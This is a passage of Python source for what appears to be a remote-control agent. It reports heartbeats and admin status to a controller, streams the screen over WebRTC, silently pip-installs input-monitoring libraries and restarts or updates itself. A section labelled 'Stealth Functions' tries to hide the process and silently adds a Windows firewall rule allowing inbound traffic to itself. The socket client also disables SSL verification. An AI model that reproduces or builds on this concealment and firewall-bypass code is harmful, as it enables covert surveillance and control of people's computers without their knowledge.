    'force_reconnect': False
}

HEARTBEAT_THREAD = None
HEARTBEAT_INTERVAL = 30
def start_heartbeat():
    global HEARTBEAT_THREAD
    agent_id = get_or_create_agent_id()
    if HEARTBEAT_THREAD and HEARTBEAT_THREAD.is_alive():
        return
    def heartbeat_worker():
        global HEARTBEAT_THREAD
        try:
            while sio and sio.connected:
                try:
                    safe_emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})
                    time.sleep(HEARTBEAT_INTERVAL)
                except KeyboardInterrupt:
                    break
                except Exception:
                    time.sleep(5)
                    continue
        finally:
            HEARTBEAT_THREAD = None
    HEARTBEAT_THREAD = threading.Thread(target=heartbeat_worker, daemon=True)
    HEARTBEAT_THREAD.start()
    try:
        log_message("[OK] Heartbeat started")
    except Exception:
        pass

ADMIN_STATUS_MONITOR = None
REPORTED_ADMIN_STATUS = None
ADMIN_STATUS_POLL_INTERVAL = 10
def start_admin_status_monitor():
    global ADMIN_STATUS_MONITOR, REPORTED_ADMIN_STATUS
    if ADMIN_STATUS_MONITOR and ADMIN_STATUS_MONITOR.is_alive():
        return
    REPORTED_ADMIN_STATUS = None
    def worker():
        global ADMIN_STATUS_MONITOR, REPORTED_ADMIN_STATUS
        try:
            while sio and sio.connected:
                try:
                    current = bool(is_admin())
                    if REPORTED_ADMIN_STATUS is None or REPORTED_ADMIN_STATUS != current:
                        REPORTED_ADMIN_STATUS = current
                        try:
                            sync_admin_status_to_controller(admin_enabled=current)
                        except Exception:
                            pass
                    time.sleep(ADMIN_STATUS_POLL_INTERVAL)
                except Exception:
                    time.sleep(5)
                    continue
        finally:
            ADMIN_STATUS_MONITOR = None
    ADMIN_STATUS_MONITOR = threading.Thread(target=worker, daemon=True)
    ADMIN_STATUS_MONITOR.start()

# WebRTC streaming variables
WEBRTC_ENABLED = True
WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
WEBRTC_STREAMS = {}  # agent_id -> MediaStreamTrack
WEBRTC_SIGNALING_QUEUE = queue.Queue()
WEBRTC_BANDWIDTH_TRACK = {}  # agent_id -> {'bytes': int, 'ts': float}
WEBRTC_EVENT_LOOPS = {}  # agent_id -> asyncio.AbstractEventLoop
WEBRTC_LOOP_THREADS = {}  # agent_id -> threading.Thread
WEBRTC_ICE_SERVERS = [
    {"urls": ["stun:stun.l.google.com:19302"]},
    {"urls": ["stun:stun1.l.google.com:19302"]}
]
WEBRTC_CONFIG = {
    'enabled': AIORTC_AVAILABLE,
    'ice_servers': [
        {'urls': 'stun:stun.l.google.com:19302'},
        {'urls': 'stun:stun1.l.google.com:19302'},
        {'urls': 'stun:stun2.l.google.com:19302'},
        {'urls': 'stun:stun3.l.google.com:19302'},
        {'urls': 'stun:stun4.l.google.com:19302'}
    ],
    'codecs': {
        'video': ['VP8', 'VP9', 'H.264'],
        'audio': ['Opus', 'PCM']
    },
    'simulcast': True,
    'svc': True,
    'bandwidth_estimation': True,
    'adaptive_bitrate': True,
    'frame_dropping': True,
    'quality_levels': {
        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000, 'quality': 50},
        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000, 'quality': 70},
        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000, 'quality': 85},
        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
    },
    'performance_tuning': {
        'keyframe_interval': 2,  # seconds
        'disable_b_frames': True,
        'ultra_low_latency': True,
        'hardware_acceleration': True,
        'gop_size': 60,  # frames at 30fps = 2 seconds
        'max_bitrate_variance': 0.3  # 30% variance allowed
    },
    'monitoring': {
        'connection_quality_metrics': True,
        'automatic_reconnection': True,
        'detailed_logging': True,
        'stats_interval': 1000,  # ms
        'quality_thresholds': {
            'min_bitrate': 100000,  # 100 kbps
            'max_latency': 1000,    # 1 second
            'min_fps': 15
        }
    }
}

# Helpers to manage per-agent asyncio loops for WebRTC (avoid cross-loop issues)
def ensure_webrtc_loop(agent_id):
    import threading
    loop = WEBRTC_EVENT_LOOPS.get(agent_id)
    if loop and not loop.is_closed():
        return loop
    loop = asyncio.new_event_loop()
    WEBRTC_EVENT_LOOPS[agent_id] = loop
    t = threading.Thread(target=loop.run_forever, name=f"webrtc-loop-{agent_id}", daemon=True)
    WEBRTC_LOOP_THREADS[agent_id] = t
    t.start()
    return loop

def run_webrtc_coro(agent_id, coro, timeout=None):
    loop = ensure_webrtc_loop(agent_id)
    fut = asyncio.run_coroutine_threadsafe(coro, loop)
    return fut.result(timeout) if timeout else fut.result()

def shutdown_webrtc_loop(agent_id):
    loop = WEBRTC_EVENT_LOOPS.get(agent_id)
    t = WEBRTC_LOOP_THREADS.get(agent_id)
    if loop:
        try:
            loop.call_soon_threadsafe(loop.stop)
        except Exception:
            pass
        try:
            if t:
                try:
                    t.join(timeout=2.0)
                except Exception:
                    pass
            loop.close()
        except Exception:
            pass
    WEBRTC_EVENT_LOOPS.pop(agent_id, None)
    WEBRTC_LOOP_THREADS.pop(agent_id, None)

# Module availability flags (already set above based on actual imports - removing duplicates)

# Production scale configuration
PRODUCTION_SCALE = {
    'current_implementation': 'aiortc_agent',  # Current: aiortc-based agent
    'target_implementation': 'mediasoup',      # Target: mediasoup for production scale
    'migration_phase': 'planning',            # Current phase: planning
    'scalability_limits': {
        'aiortc_max_viewers': 50,            # aiortc suitable for smaller setups
        'mediasoup_max_viewers': 1000,        # mediasoup for production scale
        'concurrent_agents': 100,             # Maximum concurrent agents
        'bandwidth_per_agent': 10000000       # 10 Mbps per agent
    },
    'performance_targets': {
        'target_latency': 100,                # 100ms target latency
        'target_bitrate': 5000000,            # 5 Mbps target bitrate
        'target_fps': 30,                     # 30 FPS target
        'max_packet_loss': 0.01               # 1% max packet loss
    }
}
# Module availability flags already set above - removing duplicates

def check_system_requirements():
    """
    Check system requirements and provide graceful fallbacks for missing dependencies
    """
    log_message("Checking system requirements...")
    
    requirements = {
        'Windows': WINDOWS_AVAILABLE,
        'Socket.IO': SOCKETIO_AVAILABLE,
        'psutil': PSUTIL_AVAILABLE,
        'requests': True,  # Should always be available
    }
    
    optional_features = {
        'Screen capture': MSS_AVAILABLE,
        'Audio processing': PYAUDIO_AVAILABLE,
        'Image processing': PIL_AVAILABLE,
        'GUI automation': PYAUTOGUI_AVAILABLE,
        'Input monitoring': PYNPUT_AVAILABLE,
        'OpenCV': CV2_AVAILABLE,
        'NumPy': NUMPY_AVAILABLE,
        'Speech recognition': SPEECH_RECOGNITION_AVAILABLE,
        'WebSockets': WEBSOCKETS_AVAILABLE,
        'Pygame': PYGAME_AVAILABLE,
    }
    
    # Check critical requirements
    missing_critical = [name for name, available in requirements.items() if not available]
    if missing_critical:
        log_message(f"Critical dependencies missing: {', '.join(missing_critical)}", "error")
        if not SOCKETIO_AVAILABLE:
            log_message("Socket.IO unavailable - server communication disabled", "error")
    else:
        log_message("All critical requirements satisfied")
    
    # Log optional feature status
    missing_optional = [name for name, available in optional_features.items() if not available]
    if missing_optional:
        log_message(f"Optional features unavailable: {', '.join(missing_optional)}", "warning")
    
    available_optional = [name for name, available in optional_features.items() if available]
    if available_optional:
        log_message(f"Optional features available: {', '.join(available_optional)}")
    
    return len(missing_critical) == 0

def ensure_prerequisites():
    """Ensure required Python packages for client.py are installed before use."""
    try:
        base_dir = os.path.dirname(os.path.abspath(__file__))
    except Exception:
        base_dir = os.getcwd()
    req_files = [
        os.path.join(base_dir, 'requirements-client.txt'),
        os.path.join(base_dir, 'requirements-client-minimal.txt'),
        os.path.join(base_dir, 'requirements-pure-agent.txt'),
        os.path.join(base_dir, 'requirements-simple-client.txt'),
    ]
    pkgs = set([
        'python-socketio>=5.13.0',
        'requests>=2.32.4',
        'psutil>=5.9.5',
        'mss>=10.0.0',
    ])
    def _eval_marker(marker: str) -> bool:
        m = (marker or '').strip()
        if not m:
            return True
        try:
            # Very small eval for sys_platform
            if 'sys_platform' in m:
                if '==' in m:
                    lhs, rhs = m.split('==', 1)
                    rhs = rhs.strip().strip('"\'')
                    return (sys.platform == rhs)
                if '!=' in m:
                    lhs, rhs = m.split('!=', 1)
                    rhs = rhs.strip().strip('"\'')
                    return (sys.platform != rhs)
            return True
        except Exception:
            return True
    # Parse requirement files
    for rf in req_files:
        try:
            with open(rf, 'r', encoding='utf-8') as f:
                for line in f:
                    s = line.strip()
                    if not s or s.startswith('#'):
                        continue
                    # Split environment marker
                    pkg_part, marker = (s.split(';', 1) + [''])[:2]
                    if _eval_marker(marker):
                        pkgs.add(pkg_part.strip())
        except Exception:
            continue
    # Map package specs to import names
    overrides = {
        'python-socketio': 'socketio',
        'opencv-python': 'cv2',
        'pillow': 'PIL',
        'PyTurboJPEG': 'turbojpeg',
        'py-cpuinfo': 'cpuinfo',
        'pywin32': 'win32api',
        'websocket_client': 'websocket',
        'SpeechRecognition': 'speech_recognition',
        'dxcam': 'dxcam',
        'pyaudio': 'pyaudio',
        'sounddevice': 'sounddevice',
        'pynput': 'pynput',
        'keyboard': 'keyboard',
        'pyautogui': 'pyautogui',
        'pygame': 'pygame',
        'psutil': 'psutil',
        'numpy': 'numpy',
        'mss': 'mss',
        'requests': 'requests',
        'urllib3': 'urllib3',
        'eventlet': 'eventlet',
        'aiohttp': 'aiohttp',
        'aiofiles': 'aiofiles',
        'websockets': 'websockets',
        'aiortc': 'aiortc',
        'av': 'av',
        'msgpack': 'msgpack',
        'lz4': 'lz4',
        'zstandard': 'zstandard',
        'xxhash': 'xxhash',
        'uvloop': 'uvloop',
        'cryptography': 'cryptography',
        'Cython': 'Cython',
        'setuptools': 'setuptools',
    }
    def _pkg_name(spec: str) -> str:
        # package==ver or package>=ver
        for sep in ['==', '>=', '<=', '~=', '!=']:
            if sep in spec:
                return spec.split(sep, 1)[0].strip()
        return spec.strip()
    def _import_name(pkg: str) -> str:
        return overrides.get(pkg) or pkg.replace('-', '_')
    # Build ordered list: critical -> platform-specific -> optional -> extras from files
    critical = [
        'python-socketio>=5.13.0',
        'requests>=2.32.4',
        'psutil>=5.9.5',
        'mss>=10.0.0',
    ]
    win_specific = [
        'pywin32>=306',
        'pyaudio>=0.2.11',
        'dxcam>=0.0.5',
    ] if sys.platform == 'win32' else []
    optional = [
        'numpy>=1.24.4',
        'opencv-python>=4.7.0.72',
        'pillow>=9.5.0',
        'PyTurboJPEG>=1.7.0',
        'sounddevice>=0.5.2',
        'pynput>=1.8.1',
        'keyboard>=0.13.5',
        'pyautogui>=0.9.54',
        'pygame>=2.6.1',
        'websockets>=10.4',
        'aiohttp>=3.8.0',
        'aiortc>=1.13.0',
        'av',
        'msgpack>=1.0.5',
        'lz4>=4.3.2',
        'zstandard>=0.21.0',
        'xxhash>=3.2.0',
        'cryptography>=41.0.3',
    ]
    ordered_specs = []
    seen = set()
    for group in [critical, win_specific, optional]:
        for spec in group:
            if spec not in seen:
                ordered_specs.append(spec); seen.add(spec)
    for spec in sorted(pkgs):
        if spec not in seen:
            ordered_specs.append(spec); seen.add(spec)
    # Check + install one-by-one with detailed logging
    all_ok = True
    for spec in ordered_specs:
        pkg = _pkg_name(spec)
        name = _import_name(pkg)
        try:
            log_message(f"[PREREQ] Checking {spec} (import '{name}')")
            __import__(name)
            log_message(f"[PREREQ] Already installed: {spec}")
            continue
        except Exception:
            pass
        try:
            log_message(f"[PREREQ] Installing: {spec}")
            cmd = [sys.executable, '-m', 'pip', 'install', '--disable-pip-version-check', spec]
            if sys.platform.startswith('win'):
                try:
                    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW, timeout=300, check=False)
                except Exception:
                    subprocess.run(cmd, timeout=300, check=False)
            else:
                subprocess.run(cmd, timeout=300, check=False)
            try:
                __import__(name)
                log_message(f"[PREREQ] Installed and verified: {spec}")
            except Exception as e:
                all_ok = False
                log_message(f"[PREREQ] Install OK but import failed for {spec}: {e}", "warning")
        except Exception as e:
            all_ok = False
            log_message(f"[PREREQ] Failed to install {spec}: {e}", "error")
    if all_ok:
        log_message("[PREREQ] All prerequisites satisfied")
    else:
        log_message("[PREREQ] Some prerequisites could not be installed", "warning")
    return all_ok

# --- Stealth Functions (moved here after imports) ---
def hide_process():
    """Basic process hiding."""
    if not WINDOWS_AVAILABLE:
        log_message("Windows-specific functionality not available", "warning")
        return False
    if not PSUTIL_AVAILABLE:
        log_message("psutil not available, cannot hide process", "warning")
        return False
        
    try:
        # Set process to run in background with low priority
        process = psutil.Process()
        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        return True
    except Exception as e:
        log_message(f"Failed to hide process: {e}", "error")
        return False

def add_firewall_exception():
    """Basic firewall exception."""
    if not WINDOWS_AVAILABLE:
        log_message("Windows-specific functionality not available", "warning")
        return False
        
    try:
        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
        rule_name = f"Python Agent {uuid.uuid4()}"
        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            f'name={rule_name}', 'dir=in', 'action=allow',
            f'program={current_exe}'
        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
        return True
    except Exception as e:
        log_message(f"Failed to add firewall exception: {e}", "error")
        return False

# --- Agent State (consolidated) ---
# Note: Main state variables defined later in the file to avoid duplicates

# --- WebSocket Client ---
if SOCKETIO_AVAILABLE:
    sio = socketio.Client(
        ssl_verify=False,
        engineio_logger=False,
        logger=False
    )
else:
    sio = None

def _alias_file_path():
    try:
        base = os.path.join(os.path.expanduser("~"), ".nch")
        os.makedirs(base, exist_ok=True)
        return os.path.join(base, "alias.txt")
    except Exception:
        return os.path.join(tempfile.gettempdir(), "alias.txt")

def read_local_alias():
    try:
        p = _alias_file_path()
        if os.path.exists(p):
            with open(p, "r", encoding="utf-8") as f:
                s = f.read().strip()
                return s
        return ""
    except Exception:
        return ""

def write_local_alias(alias: str):
    try:
        p = _alias_file_path()
        a = str(alias or "").strip()
        if a:
            with open(p, "w", encoding="utf-8") as f:
                f.write(a)
        else:
            try:
                if os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass
        return True
    except Exception:
        return False
def notify_controller_client_only(agent_id: str):
    """Notify controller that this instance is running in client-only mode.
    Emits a lightweight event after connection or pre-connection log.
    """
    try:
        if RUN_MODE == 'agent' and SOCKETIO_AVAILABLE and sio is not None:
            # If already connected, emit immediately; otherwise just log
            if hasattr(sio, 'connected') and sio.connected:
                safe_emit('client_only', {'agent_id': agent_id, 'timestamp': time.time()})  # [ OK ] SAFE
                log_message("Notified controller: client-only mode")
            else:
                log_message("Will notify controller (client-only) after connect")
        else:
            log_message("Client-only notification skipped (not agent mode or no socket)", "warning")
    except Exception as e:
        log_message(f"Client-only notify error: {e}", "warning")

def send_email_notification(subject: str, body: str) -> bool:
    """Send an email notification via Gmail SMTP using app password.
    Returns True on success, False otherwise.
    """
    if not EMAIL_NOTIFICATIONS_ENABLED:
        return False
    if not (GMAIL_USERNAME and GMAIL_APP_PASSWORD and EMAIL_RECIPIENT):
        log_message("Email not sent: missing Gmail credentials or recipient", "warning")
        return False
    try:
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = GMAIL_USERNAME
        msg['To'] = EMAIL_RECIPIENT
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(GMAIL_USERNAME, GMAIL_APP_PASSWORD)
            server.sendmail(GMAIL_USERNAME, [EMAIL_RECIPIENT], msg.as_string())
        return True
    except Exception as e:
        log_message(f"Email send failed: {e}", "error")
        return False

# Notification System
def emit_agent_notification(notification_type: str, title: str, message: str, 
                           category: str):
    """Emit a notification from agent to controller"""
    try:
        if not SOCKETIO_AVAILABLE or not sio:
            log_message("Cannot emit notification: Socket.IO not available", "warning")
            return None
            
        notification = {
            'id': f'notif_{int(time.time())}_{secrets.token_hex(4)}',
            'type': notification_type,  # 'success', 'warning', 'error', 'info'
            'title': title,
            'message': message,
            'category': category,  # 'agent', 'system', 'security', 'command'
            'agent_id': get_or_create_agent_id(),
            'timestamp': datetime.datetime.now().isoformat(),
            'read': False
        }
        
        safe_emit('agent_notification', notification)
        log_message(f"[ NOTIFICATION ] Notification emitted: {title} ({category})", "info")
        return notification['id']
    except Exception as e:
        log_message(f"Error emitting notification: {e}", "error")
        return None

def emit_security_notification(notification_type: str, title: str, message: str):
    """Emit a security notification from agent"""
    return emit_agent_notification(notification_type, title, message, 'security')

def emit_system_notification(notification_type: str, title: str, message: str):
    """Emit a system notification from agent"""
    return emit_agent_notification(notification_type, title, message, 'system')

def emit_command_notification(notification_type: str, title: str, message: str):
    return emit_agent_notification(notification_type, title, message, 'command')

def sync_admin_status_to_controller(agent_id: str = None, admin_enabled: bool = None):
    try:
        import requests
        aid = agent_id or get_or_create_agent_id()
        status = bool(is_admin()) if admin_enabled is None else bool(admin_enabled)
        url = f"{SERVER_URL}/api/system/agent/admin"
        payload = {"agent_id": aid, "admin_enabled": status}
        try:
            requests.post(url, json=payload, timeout=5)
        except Exception:
            pass
    except Exception:
        pass
def emit_update_notification(notification_type: str, title: str, message: str, update_data: Dict[str, Any] = None):
    """Emit an update notification from agent with optional update data"""
    notification_payload = {
        'type': notification_type,
        'title': title,
        'message': message,
        'timestamp': time.time(),
        'agent_id': get_or_create_agent_id(),
        'category': 'update'
    }
    
    if update_data:
        notification_payload['update_data'] = update_data
    
    try:
        sio.emit('agent_notification', notification_payload)
        log_message(f"[ NOTIFICATION ] Update notification: {title} - {message}")
        
        # Also notify the updater system if available
        if UPDATER_AVAILABLE:
            try:
                handle_update_notification(notification_payload)
            except Exception as e:
                log_message(f"[ ! ] Failed to notify updater system: {e}", "warning")
                
    except Exception as e:
        log_message(f"Failed to emit update notification: {e}", "error")

def notify_agent_selected(agent_id: str = None):
    """Notify when an agent is selected in the controller"""
    current_agent_id = agent_id or get_or_create_agent_id()
    emit_update_notification('info', 'Agent Selected', f'Agent {current_agent_id} has been selected', {
        'event': 'agent_selected',
        'agent_id': current_agent_id,
        'timestamp': time.time()
    })

def notify_new_code_loaded(code_info: Dict[str, Any]):
    """Notify when new code is loaded to the agent"""
    emit_update_notification('info', 'New Code Loaded', 'New agent code has been loaded', {
        'event': 'code_loaded',
        'code_info': code_info,
        'timestamp': time.time()
    })
    
    # Log the notification
    update_logger.log_update_activity('new_code_loaded', {
        'message': 'New agent code loaded',
        'code_info': code_info
    })
    
    # Update status
    update_status_reporter.update_status('new_code_loaded', {
        'code_info': code_info,
        'timestamp': time.time()
    })

def notify_update_available(update_info: Dict[str, Any]):
    """Notify when updates are available for the agent"""
    emit_update_notification('warning', 'Update Available', 'New updates are available for this agent', {
        'event': 'update_available',
        'update_info': update_info,
        'timestamp': time.time()
    })
    
    # Log the notification
    update_logger.log_update_activity('update_available', {
        'message': 'New updates available for agent',
        'update_info': update_info
    })
    
    # Update status
    update_status_reporter.update_status('update_available', {
        'update_info': update_info,
        'timestamp': time.time()
    })

def notify_update_started(update_info: Dict[str, Any]):
    """Notify when an update process starts"""
    emit_update_notification('info', 'Update Started', 'Agent update process has started', {
        'event': 'update_started',
        'update_info': update_info,
        'timestamp': time.time()
    })
    
    # Log the notification
    update_logger.log_update_activity('update_started', {
        'message': 'Agent update process started',
        'update_info': update_info
    })
    
    # Update status
    update_status_reporter.update_status('update_started', {
        'update_info': update_info,
        'timestamp': time.time()
    })

def notify_update_completed(update_info: Dict[str, Any]):
    """Notify when an update process completes successfully"""
    emit_update_notification('success', 'Update Completed', 'Agent update completed successfully', {
        'event': 'update_completed',
        'update_info': update_info,
        'timestamp': time.time()
    })
    
    # Log the notification
    update_logger.log_update_activity('update_completed', {
        'message': 'Agent update process completed successfully',
        'update_info': update_info
    })
    
    # Update status
    update_status_reporter.update_status('update_completed', {
        'update_info': update_info,
        'timestamp': time.time()
    })

def notify_update_failed(error_info: Dict[str, Any]):
    """Notify when an update process fails"""
    emit_update_notification('error', 'Update Failed', f'Agent update failed: {error_info.get("error", "Unknown error")}', {
        'event': 'update_failed',
        'error_info': error_info,
        'timestamp': time.time()
    })
    
    # Log the notification
    update_logger.log_update_activity('update_failed', {
        'message': f'Agent update process failed: {error_info.get("error", "Unknown error")}',
        'error_info': error_info
    }, level='error')
    
    # Update status
    update_status_reporter.update_status('update_failed', {
        'error_info': error_info,
        'timestamp': time.time()
    })
    
    # Log the notification
    update_logger.log_update_activity('update_failed', {
        'message': f'Agent update process failed: {error_info.get("error", "Unknown error")}',
        'error_info': error_info
    }, level='error')
    
    # Update status
    update_status_reporter.update_status('update_failed', {
        'error_info': error_info,
        'timestamp': time.time()
    })

# --- File Monitoring and Update Validation System ---
class FileIntegrityMonitor:
    """Monitors file integrity and validates updates"""
    
    def __init__(self):
        self.monitored_files = {}
        self.file_hashes = {}
        self.monitoring_active = False
        self.monitor_thread = None
        self.monitor_lock = threading.Lock()
    
    def start_monitoring(self, file_paths: List[str] = None):
        """Start monitoring specified files for changes"""
        if file_paths is None:
            # Monitor the current script by default
            file_paths = [__file__]
        
        with self.monitor_lock:
            self.monitored_files = {path: os.path.getmtime(path) if os.path.exists(path) else 0 
                                  for path in file_paths}
            self.file_hashes = {path: self._calculate_file_hash(path) 
                              for path in file_paths if os.path.exists(path)}
            self.monitoring_active = True
            
            if self.monitor_thread is None or not self.monitor_thread.is_alive():
                self.monitor_thread = threading.Thread(target=self._monitor_files, daemon=True)
                self.monitor_thread.start()
                
        log_message(f"[ MAGNIFIED ] File integrity monitoring started for {len(file_paths)} files")
        
        # Log monitoring start
        update_logger.log_update_activity('file_monitoring_started', {
            'message': f'File integrity monitoring started for {len(file_paths)} files',
            'files_monitored': file_paths,
            'total_files': len(file_paths)
        })
        
        # Update status
        update_status_reporter.update_status('file_monitoring_started', {
            'files_monitored': file_paths,
            'total_files': len(file_paths),
            'timestamp': time.time()
        })
    
    def stop_monitoring(self):
        """Stop file monitoring"""
        with self.monitor_lock:
            self.monitoring_active = False
        log_message("[ MAGNIFIED ] File integrity monitoring stopped")
        
        # Log monitoring stop
        update_logger.log_update_activity('file_monitoring_stopped', {
            'message': 'File integrity monitoring stopped',
            'files_monitored': list(self.monitored_files.keys())
        })
        
        # Update status
        update_status_reporter.update_status('file_monitoring_stopped', {
            'files_monitored': list(self.monitored_files.keys()),
            'timestamp': time.time()
        })
    
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calculate SHA256 hash of a file"""
        try:
            import hashlib
            with open(file_path, 'rb') as f:
                return hashlib.sha256(f.read()).hexdigest()
        except Exception as e:
            log_message(f"[ ! ] Failed to calculate hash for {file_path}: {e}", "warning")
            return ""
    
    def _monitor_files(self):
        """Background thread to monitor file changes"""
        while self.monitoring_active:
            try:
                with self.monitor_lock:
                    for file_path in list(self.monitored_files.keys()):
                        if not os.path.exists(file_path):
                            continue
                            
                        current_mtime = os.path.getmtime(file_path)
                        current_hash = self._calculate_file_hash(file_path)
                        
                        if (current_mtime != self.monitored_files.get(file_path, 0) or 
                            current_hash != self.file_hashes.get(file_path, "")):
                            
                            # File has changed
                            log_message(f"[ FILE ] File changed detected: {file_path}")
                            self.monitored_files[file_path] = current_mtime
                            self.file_hashes[file_path] = current_hash
                            
                            # Log file change
                            update_logger.log_update_activity('file_change_detected', {
                                'message': f'File change detected: {file_path}',
                                'file_path': file_path,
                                'new_hash': current_hash,
                                'new_mtime': current_mtime
                            })
                            
                            # Update status
                            update_status_reporter.update_status('file_change_detected', {
                                'file_path': file_path,
                                'new_hash': current_hash,
                                'new_mtime': current_mtime,
                                'timestamp': time.time()
                            })
                            
                            # Notify about the change
                            if UPDATER_AVAILABLE:
                                try:
                                    notify_new_code_loaded({
                                        'file_path': file_path,
                                        'new_hash': current_hash,
                                        'timestamp': current_mtime
                                    })
                                except Exception as e:
                                    log_message(f"[ ! ] Failed to notify about file change: {e}", "warning")
                
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                log_message(f"[ ! ] Error in file monitoring: {e}", "warning")
                
                # Log monitoring error
                update_logger.log_update_activity('file_monitoring_error', {
                    'message': f'Error in file monitoring: {e}',
                    'error': str(e)
                }, level='warning')
                
                # Update status
                update_status_reporter.update_status('file_monitoring_error', {
                    'error': str(e),
                    'timestamp': time.time()
                })
                time.sleep(10)  # Wait longer on error
    
    def validate_update_package(self, update_package: Dict[str, Any]) -> Dict[str, Any]:
        """Validate an update package before applying"""
        try:
            validation_result = {
                'valid': False,
                'errors': [],
                'warnings': [],
                'package_info': {}
            }
            
            # Check required fields
            required_fields = ['version', 'files', 'timestamp', 'checksum']
            for field in required_fields:
                if field not in update_package:
                    validation_result['errors'].append(f"Missing required field: {field}")
            
            if validation_result['errors']:
                return validation_result
            
            # Validate version format
            version = update_package.get('version', '')
            if not version or not isinstance(version, str):
                validation_result['errors'].append("Invalid version format")
            
            # Validate files
            files = update_package.get('files', {})
            if not isinstance(files, dict) or not files:
                validation_result['errors'].append("Invalid or empty files dictionary")
            
            # Validate checksum
            expected_checksum = update_package.get('checksum', '')
            if not expected_checksum:
                validation_result['errors'].append("Missing package checksum")
            
            # Calculate actual checksum
            import hashlib
            import json
            package_copy = update_package.copy()
            package_copy.pop('checksum', None)  # Remove checksum from calculation
            actual_checksum = hashlib.sha256(json.dumps(package_copy, sort_keys=True).encode()).hexdigest()
            
            if expected_checksum and actual_checksum != expected_checksum:
                validation_result['errors'].append("Package checksum mismatch - possible corruption")
            
            # Validate file contents
            for file_path, file_content in files.items():
                if not isinstance(file_content, str):
                    validation_result['errors'].append(f"Invalid content for file: {file_path}")
                elif len(file_content) == 0:
                    validation_result['warnings'].append(f"Empty content for file: {file_path}")
            
            # Set overall validation result
            validation_result['valid'] = len(validation_result['errors']) == 0
            validation_result['package_info'] = {
                'version': version,
                'file_count': len(files),
                'timestamp': update_package.get('timestamp', 0),
                'checksum_valid': expected_checksum == actual_checksum
            }
            
            return validation_result
            
        except Exception as e:
            return {
                'valid': False,
                'errors': [f"Validation error: {str(e)}"],
                'warnings': [],
                'package_info': {}
            }

# Global file monitor instance
file_monitor = FileIntegrityMonitor()

# --- Automatic Restart and Verification System ---
class RestartManager:
    """Manages automatic restart and verification of the agent after updates"""
    
    def __init__(self):
        self.restart_scheduled = False
        self.restart_delay = 5  # seconds
        self.verification_timeout = 30  # seconds
        self.restart_lock = threading.Lock()
        self.verification_data = {}
    
    def schedule_restart(self, reason: str = "update", delay: int = None):
        """Schedule an automatic restart"""
        with self.restart_lock:
            if self.restart_scheduled:
                log_message("[ ! ] Restart already scheduled, ignoring new request")
                return False
            
            self.restart_scheduled = True
            delay = delay or self.restart_delay
            
            log_message(f"[ RESTARTING ] Scheduling restart in {delay} seconds (reason: {reason})")
            
            restart_thread = threading.Thread(
                target=self._perform_restart,
                args=(reason, delay),
                daemon=True
            )
            restart_thread.start()
            
            return True
    
    def _perform_restart(self, reason: str, delay: int):
        """Perform the actual restart sequence"""
        try:
            # Log restart initiation
            update_logger.log_update_activity('restart_scheduled', {
                'message': f'Agent restart scheduled for {delay} seconds',
                'reason': reason,
                'delay': delay
            })
            
            # Update status
            update_status_reporter.update_status('restart_scheduled', {
                'reason': reason,
                'delay': delay,
                'timestamp': time.time()
            })
            
            # Wait for the specified delay
            time.sleep(delay)
            
            # Store verification data before restart
            self._store_verification_data(reason)
            
            # Log verification data storage
            update_logger.log_update_activity('verification_data_stored', {
                'message': 'Verification data stored for post-restart validation',
                'reason': reason,
                'verification_data': self.verification_data
            })
            
            # Notify about the restart
            emit_update_notification('info', 'Agent Restarting', f'Agent restarting due to {reason}', {
                'event': 'agent_restarting',
                'reason': reason,
                'timestamp': time.time()
            })
            
            # Update status
            update_status_reporter.update_status('agent_restarting', {
                'reason': reason,
                'timestamp': time.time()
            })
            
            # Save current state
            self._save_agent_state()
            
            # Log state save
            update_logger.log_update_activity('agent_state_saved', {
                'message': 'Agent state saved before restart',
                'reason': reason
            })
            
            # Perform the restart
            log_message("[ RESTARTING ] Executing agent restart...")
            
            # Get the current script path
            if getattr(sys, 'frozen', False):
                # Running as compiled executable
                script_path = sys.executable
                restart_command = [script_path]
            else:
                # Running as Python script
                script_path = os.path.abspath(__file__)
                restart_command = [sys.executable, script_path]
            
            # Add any existing command line arguments
            restart_command.extend(sys.argv[1:])
            
            # Execute the restart
            import subprocess
            env = os.environ.copy()
            env["CLIENT_ALLOW_SELF_SPAWN"] = "1"
            subprocess.Popen(restart_command, env=env)
            
            # Exit current process
            log_message("[ RESTARTING ] Restart command executed, exiting current process...")
            os._exit(0)
            
        except Exception as e:
            log_message(f"[ X ] Restart failed: {e}", "error")
            self.restart_scheduled = False
            
            # Log restart failure
            update_logger.log_update_activity('restart_failed', {
                'message': f'Agent restart failed: {e}',
                'error': str(e),
                'reason': reason
            }, level='error')
            
            # Update status
            update_status_reporter.update_status('restart_failed', {
                'error': str(e),
                'reason': reason,
                'timestamp': time.time()
            })
            
            emit_update_notification('error', 'Restart Failed', f'Agent restart failed: {e}', {
                'event': 'restart_failed',
                'error': str(e),
                'timestamp': time.time()
            })
    
    def _store_verification_data(self, reason: str):
        """Store data for post-restart verification"""
        self.verification_data = {
            'restart_reason': reason,
            'restart_time': time.time(),
            'agent_id': get_or_create_agent_id(),
            'version': VERSION,
            'pid': os.getpid()
        }
        
        # Save to a temporary file for verification after restart
        try:
            import json
            verification_file = os.path.join(tempfile.gettempdir(), f'agent_restart_{os.getpid()}.json')
            with open(verification_file, 'w') as f:
                json.dump(self.verification_data, f)
            log_message(f"[DATA] Verification data stored in {verification_file}")
        except Exception as e:
            log_message(f"[ ! ] Failed to store verification data: {e}", "warning")
    
    def _save_agent_state(self):
        """Save current agent state before restart"""
        try:
            state_data = {
                'timestamp': time.time(),
                'agent_id': get_or_create_agent_id(),
                'version': VERSION,
                'connections': {
